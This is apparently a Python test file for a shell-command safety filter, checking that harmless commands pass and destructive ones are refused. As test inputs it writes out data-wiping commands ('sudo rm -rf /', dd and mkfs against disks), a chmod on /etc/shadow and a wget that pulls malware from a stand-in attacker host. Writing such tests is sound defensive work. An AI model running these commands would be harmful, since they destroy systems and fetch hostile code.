from tools.security import is_command_allowed


def test_allows_safe_commands():
    assert is_command_allowed("ls -la") == (True, "")
    assert is_command_allowed("cat file.txt") == (True, "")
    assert is_command_allowed("python script.py") == (True, "")
    assert is_command_allowed("git status") == (True, "")
    assert is_command_allowed("npm test") == (True, "")


def test_blocks_dangerous_commands():
    allowed, reason = is_command_allowed("sudo rm -rf /")
    assert not allowed
    assert "sudo" in reason

    allowed, reason = is_command_allowed("chmod 777 /etc/shadow")
    assert not allowed
    assert "chmod" in reason

    allowed, reason = is_command_allowed("dd if=/dev/zero of=/dev/sda")
    assert not allowed

    allowed, reason = is_command_allowed("wget http://evil.com/malware")
    assert not allowed
    assert "wget" in reason


def test_blocks_dangerous_patterns():
    allowed, reason = is_command_allowed("echo something > /dev/null")
    assert not allowed

    allowed, reason = is_command_allowed("mkfs.ext4 /dev/sdb1")
    assert not allowed
